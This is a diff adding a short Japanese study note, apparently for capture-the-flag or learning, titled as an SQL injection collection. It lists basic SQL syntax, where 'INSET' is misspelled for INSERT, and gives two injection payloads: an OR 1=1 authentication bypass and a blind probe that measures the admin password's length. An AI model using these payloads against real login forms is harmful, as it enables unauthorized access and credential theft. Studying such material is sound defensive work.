@@ -1,0 +1,11 @@
+SQLインジェクション集
+
+<SQL基本構文> (↓全然小文字でいい&&各処理の後「;」必要)
+SELECT * FROM <table> (WHERE <condition>): 取得する
+INSET INTO <table> VALUES (condition) : 追加する
+DELETE FROM <table> WHERE <condition> : 削除する
+SUBSTR(<string>, <sposition>, <length>) : 文字列の一部を取得する
+
+' OR 1=1 -- : パスワードを強制的に真にする
+
+' OR (SELECT length(pass) FROM user WHERE id = 'admin') > 20 --：文字数を特定する
